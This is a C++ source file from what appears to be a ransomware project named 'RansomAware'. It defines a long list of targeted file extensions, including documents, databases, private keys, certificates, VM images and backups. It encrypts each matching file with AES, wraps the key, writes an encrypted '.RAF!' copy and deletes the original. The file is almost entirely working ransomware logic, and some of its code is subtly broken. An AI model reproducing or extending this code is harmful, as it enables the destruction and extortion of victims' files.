#include "FileEncrypter.hpp"
#include "..\include\include.hpp"

#include <openssl/evp.h>
#include <openssl/sha.h>
#include <filesystem>

namespace fs = std::filesystem;

CryptoKeyManager*                       m_keyMgr{ nullptr };                ///< Pointer to Crypto Key Manager.
const std::string						m_header{ _("!RansomAware!") };     ///< File header string.
const std::string						m_fileExtension{ _(".RAF!") };      ///< File extension for encrypted files.
const std::unordered_set<std::string>	m_fileExtensions({                  ///< Set of valid file extensions.
            _(".docx"), _(".ppam"), _(".sti"), _(".vcd"), 	_(".3gp"), _(".sch"), _(".myd"), _(".wb2"),
            _(".docb"), _(".potx"), _(".sldx"), _(".jpeg"), _(".mp4"), _(".dch"), _(".frm"), _(".slk"),
            _(".docm"), _(".potm"), _(".sldm"), _(".jpg"), _(".mov"), _(".dip"), _(".odb"), _(".dif"),
            _(".dot"), _(".pst"), _(".sldm"), _(".bmp"), _(".avi"), _(".pl"), _(".dbf"), _(".stc"),
            _(".dotm"), _(".ost"), _(".vdi"), _(".png"), _(".asf"), _(".vb"), _(".db"), _(".sxc"),
            _(".dotx"), _(".msg"), _(".vmdk"), _(".gif"), _(".mpeg"), _(".vbs"), _(".mdb"), _(".ots"),
            _(".xls"), _(".eml"), _(".vmx"), _(".raw"), _(".vob"), _(".ps1"), _(".accdb"), _(".ods"),
            _(".xlsm"), _(".vsd"), _(".aes"), _(".tif"), _(".wmv"), _(".cmd"), _(".sqlitedb"), _(".max"),
            _(".xlsb"), _(".vsdx"), _(".ARC"), _(".tiff"), _(".fla"), _(".js"), _(".sqlite3"), _(".3ds"),
            _(".xlw"), _(".txt"), _(".PAQ"), _(".nef"), _(".swf"), _(".asm"), _(".asc"), _(".uot"),
            _(".xlt"), _(".csv"), _(".bz2"), _(".psd"), _(".wav"), _(".h"), _(".lay6"), _(".stw"),
            _(".xlm"), _(".rtf"), _(".tbk"), _(".ai"), _(".mp3"), _(".pas"), _(".lay"), _(".sxw"),
            _(".xlc"), 	_(".123"), _(".bak"), _(".svg"), _(".sh"), _(".cpp"), _(".mml"), _(".ott"),
            _(".xltx"), _(".wks"), _(".tar"), _(".djvu"), 	_(".class"), _(".c"), _(".sxm"), _(".odt"),
            _(".xltm"), _(".wk1"), _(".tgz"), _(".m4u"), _(".jar"), _(".cs"), _(".otg"), _(".pem"),
            _(".ppt"), _(".pdf"), _(".gz"), _(".m3u"), _(".java"), _(".suo"), _(".odg"), _(".p12"),
            _(".pptx"), _(".dwg"), 	_(".7z"), _(".mid"), _(".rb"), _(".sln"), _(".uop"), _(".csr"),
            _(".pptm"), _(".onetoc2"), _(".rar"), _(".wma"), _(".asp"), _(".ldf"), _(".std"), _(".crt"),
            _(".pot"), _(".snt"), _(".zip"), _(".flv"), _(".php"), _(".mdf"), _(".sxd"), _(".key"),
            _(".pps"), _(".hwp"), _(".backup"), _(".3g2"), _(".jsp"), _(".ibd"), _(".otp"), _(".pfx"),
            _(".ppsm"), _(".602"), _(".iso"), _(".mkv"), _(".brd"), _(".myi"), _(".odp"), _(".der"),
            _(".ppsx"), _(".sxi"), _(".xlsx"), m_fileExtension
    });

FileEncrypter::FileEncrypter()
{
}

FileEncrypter::~FileEncrypter()
{
    m_keyMgr = nullptr;
}

void FileEncrypter::init(CryptoKeyManager* keyMgr)
{
    m_keyMgr = keyMgr;
}

bool FileEncrypter::encryptFile(const char* path)
{
    if (not m_keyMgr)
        return false;

    // Validate the file path
    if (not isFileValid(path))
		return false;

    // Reading the original file
    std::ifstream inFile(path, std::ios::binary);
    if (not inFile.good())
        return false;

    // Checking if the file is not already encrypted
    if (isAlreadyEncrypted(inFile))
		return false;

    // Generating the AES key
    CryptoKeyManager::AESKey aes;
    if (not m_keyMgr->generateAESKey(&aes))
        return false;

    // Reading file data
    inFile.seekg(0, std::ios::beg);
    std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // Encrypting file data
    if (not encryptData(&fileData, aes))
        return false;

    // Encrypting the AES key
    if (not m_keyMgr->encryptAESKey(&aes))
        return false;

    // Writing encrypted data to a new file
    std::ofstream outFile(path + m_fileExtension, std::ios::binary);
    addFileHeader(outFile, aes);
    outFile.write(reinterpret_cast<char*>(fileData.data()), fileData.size());
    outFile.close();
    
    // Deleting the original file
    fs::remove(path);

    return true;
}

bool FileEncrypter::decryptFile(const char* path)
{
    if (not m_keyMgr)
        return false;

    // Validate the file path
    if (not isFileValid(path))
        return false;

    // Reading the encrypted file
    std::ifstream inFile(path, std::ios::binary);
    if (not inFile.good())
		return false;

    // Checking if the file is encrypted
	if (not isAlreadyEncrypted(inFile))
        return false;

    // Reading file header
	CryptoKeyManager::AESKey aes;
	if (not extractAesFromHeader(inFile, &aes))
		return false;

    // Decrypting the AES key
    if (not m_keyMgr->decryptAESKey(&aes))
		return false;

    // Reading file data
    std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // Decrypting file data
    if (not decryptData(&fileData, aes))
		return false;

    // Writing decrypted data to a new file
    std::string tmpPath = path;
	std::ofstream outFile = std::ofstream(tmpPath.substr(0, tmpPath.size() - m_fileExtension.size()), std::ios::binary);
    outFile.write(reinterpret_cast<char*>(fileData.data()), fileData.size());

    // Deleting the encrypted file
    fs::remove(path);

	return true;
}

bool FileEncrypter::computeFileSHA256(const char* path, std::string* hashOut)
{
    std::ifstream file(path, std::ios::binary);
    if (not file)
        return false;

    auto* ctx = EVP_MD_CTX_new();
    if (not ctx)
        return false;

    if (EVP_DigestInit_ex(ctx, EVP_sha256(), nullptr) != 1) 
    {
        EVP_MD_CTX_free(ctx);
        return false;
    }

    std::vector<unsigned char> buffer(0x2000);
    while (file.good()) 
    {
        file.read(reinterpret_cast<char*>(buffer.data()), buffer.size());
        if (EVP_DigestUpdate(ctx, buffer.data(), file.gcount()) != 1) 
        {
            EVP_MD_CTX_free(ctx);
            return false;
        }
    }

    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int lengthOfHash = 0;
    if (EVP_DigestFinal_ex(ctx, hash, &lengthOfHash) != 1) 
    {
        EVP_MD_CTX_free(ctx);
        return false;
    }

    std::stringstream ss;
    for (unsigned int i = 0; i < lengthOfHash; ++i)
        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(hash[i]);

    EVP_MD_CTX_free(ctx);

    *hashOut = ss.str();

    return true;
}

const std::unordered_set<std::string>& FileEncrypter::getTargetFileExtensions() const
{
    return m_fileExtensions;
}

const std::string& FileEncrypter::getEncryptedFileExtension() const
{
    return m_fileExtension;
}

bool FileEncrypter::encryptData(std::vector<unsigned char>* data, const CryptoKeyManager::AESKey& aes)
{
    if (not data or aes.isEncrypted())
    	return false;

    std::vector<unsigned char> encryptedData(data->size() + CryptoKeyManager::AESKey::KEY_SIZE);

    auto* ctx = EVP_CIPHER_CTX_new();
    if (not ctx)
        return false;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr, aes.key.data(), aes.iv.data()) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int len;
    if (EVP_EncryptUpdate(ctx, encryptedData.data(), &len, data->data(), int(data->size())) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int finalLen;
    if (EVP_EncryptFinal_ex(ctx, encryptedData.data() + len, &finalLen) != 1) 
    {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    encryptedData.resize(len + finalLen);
    EVP_CIPHER_CTX_free(ctx);

    *data = std::move(encryptedData);

    return true;
}

bool FileEncrypter::decryptData(std::vector<unsigned char>* data, const CryptoKeyManager::AESKey& aes)
{
    if (not data or aes.isEncrypted())
        return false;

    std::vector<unsigned char> decryptedData(data->size());

    auto* ctx = EVP_CIPHER_CTX_new();
    if (not ctx)
        return false;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr, aes.key.data(), aes.iv.data()) != 1) 
    {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int len;
    if (EVP_DecryptUpdate(ctx, decryptedData.data(), &len, data->data(), int(data->size())) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int finalLen;
    if (EVP_DecryptFinal_ex(ctx, decryptedData.data() + len, &finalLen) != 1) 
    {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    decryptedData.resize(len + finalLen);
    EVP_CIPHER_CTX_free(ctx);

    *data = std::move(decryptedData);

    return true;
}

bool FileEncrypter::addFileHeader(std::ofstream& file, CryptoKeyManager::AESKey& aes)
{
    file << m_header;
    file.write(reinterpret_cast<char*>(aes.key.data()), aes.key.size());
    file.write(reinterpret_cast<char*>(aes.iv.data()), aes.iv.size());
    
    return false;
}

bool FileEncrypter::extractAesFromHeader(std::ifstream& file, CryptoKeyManager::AESKey* aes)
{
    std::vector<unsigned char> keys(CryptoKeyManager::AESKey::KEY_ENCRYPTED_SIZE + CryptoKeyManager::AESKey::IV_SIZE);
    file.read(reinterpret_cast<char*>(keys.data()), keys.size());

    aes->key = std::vector<unsigned char>(keys.begin(), keys.begin() + CryptoKeyManager::AESKey::KEY_ENCRYPTED_SIZE);
    aes->iv = std::vector<unsigned char>(keys.begin() + CryptoKeyManager::AESKey::KEY_ENCRYPTED_SIZE, keys.end());

	return true;
}

bool FileEncrypter::isAlreadyEncrypted(std::ifstream& file)
{
    std::vector<unsigned char> header(m_header.size());
    file.read(reinterpret_cast<char*>(header.data()), header.size());

    for (size_t i = 0; i < header.size(); i++)
    {
        if (header[i] != m_header[i])
            return false;
	}

	return true;
}

bool FileEncrypter::isFileValid(const std::string& path)
{
    fs::path filePath(path);

    if (not fs::exists(filePath))
        return false;

    if (not fs::is_regular_file(filePath))
        return false;

    if (fs::file_size(filePath) == 0) // in bytes
        return false;

    // Is file extension valid?
    if (m_fileExtensions.find(filePath.extension().string()) == m_fileExtensions.end())
        return false;

    return true;
}
